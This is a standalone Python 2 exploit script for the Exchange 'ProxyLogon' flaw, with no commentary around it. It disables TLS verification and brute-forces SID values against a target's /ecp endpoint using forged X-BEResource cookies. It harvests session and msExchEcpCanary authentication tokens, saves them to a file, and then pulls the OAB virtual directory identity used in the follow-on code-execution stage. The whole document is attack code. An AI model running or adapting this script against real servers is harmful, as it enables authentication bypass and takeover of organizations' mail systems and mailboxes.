import urllib2
import httplib
import sys
import base64
import os
import ssl
import json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


URL = "https://target.com/ecp/test.js"
HOSTNAMES = "mail"
SSID = ""


for i in range(1100,4000):
    NET_SessionId = ''
    msExchEcpCanary = ''
    SID_OK = SSID + str(i)
    print 'USE SID: ', SID_OK

    SID = '<r at="Negotiate" ln=""><s>'+SID_OK+'</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s></r>'

    r = urllib2.Request(URL,data=SID,headers={'Content-Type': 'text/xml',
						'User-Agent': 'ExchangeServicesClient/0.0.0.0',
						'Cookie':'X-BEResource=@'+HOSTNAMES+':444/ecp/proxylogon.ecp?#~1941962753;',
						'msExchLogonMailbox':SID_OK,
						})


    try:
        r = urllib2.urlopen(r,context=ctx,timeout=5)
    except Exception as e:
        print e    
        r = e

    try:
        cookie = r.info()['Set-Cookie'].split(' ')
        for c in cookie:
            if c.find('NET_SessionId') != -1:
                NET_SessionId = c.split('=')[1].replace(';','')
            elif c.find('msExchEcpCanary') != -1:
                msExchEcpCanary = c.split('=')[1].replace(';','')
		
        if(len(NET_SessionId) > 2 and len(msExchEcpCanary) > 2):
            print '='*40
            print 'NET_SessionId:',NET_SessionId
            print 'msExchEcpCanary:',msExchEcpCanary
            print SID_OK
            fp = open(HOSTNAMES+'.txt','a')
            fp.write('NET_SessionId:'+NET_SessionId+'\n'+'msExchEcpCanary:'+msExchEcpCanary+'\n'+SID_OK+'\n\n')
            fp.close()
            print 'GET VirtualDirectory'
            data = '{"filter":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","SelectedView":"","SelectedVDirType":"All"}},"sort":{}}'
            r = urllib2.Request(URL,data=data,headers={      'Content-Type': 'application/json',
                                                 'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                 'Cookie':'X-BEResource=@'+HOSTNAMES+':444/ecp/DDI/DDIService.svc/GetList?schema=VirtualDirectory&msExchEcpCanary='+msExchEcpCanary+'&a=#~1942062564; msExchEcpCanary='+msExchEcpCanary+'; ASP.NET_SessionId='+NET_SessionId+';',
                                                 'msExchLogonMailbox': SID_OK,
                                                 })
            try:
                r = urllib2.urlopen(r,context=ctx)		    
                DDATA = r.read()
                html_json = str(DDATA)
                html_json = json.loads(html_json)		    
                for i in html_json['d']['Output']:
                    if(i["Name"] == 'OAB (Default Web Site)'):
                        RawIdentity = i["Identity"]["RawIdentity"]
                        ServerS = i["Server"]
                        print ServerS,"\t\t", RawIdentity
                        break
            except Exception as e:
                print e
            print '='*40

    except Exception as e:
	    print e 
